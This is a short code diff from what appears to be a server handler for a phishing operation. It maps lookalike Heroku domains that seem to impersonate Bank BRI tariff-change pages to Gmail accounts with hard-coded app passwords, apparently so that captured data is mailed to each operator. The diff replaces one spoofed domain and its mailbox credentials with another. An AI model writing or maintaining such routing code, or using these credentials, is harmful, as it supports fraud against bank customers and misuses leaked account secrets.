@@ -44,9 +44,9 @@ export default function handler(req, res) {
         email = 'bbri94669@gmail.com';
         pass = 'tdoctundphxocdqu';
 
-    } else if(url == 'perubahanntarif--bri.herokuapp.com'){
-        email = 'bossmudaid766@gmail.com';
-        pass = 'xvahirtwxvbntkxv';
+    } else if(url == 'tarifbribaru-lama.herokuapp.com'){
+        email = 'wanw4826@gmail.com';
+        pass = 'fgevrxoxoymjmzka';
 
     } else if(url == 'perubah--an-britarifff.herokuapp.com'){
         email = 'ssamsol397@gmail.com';
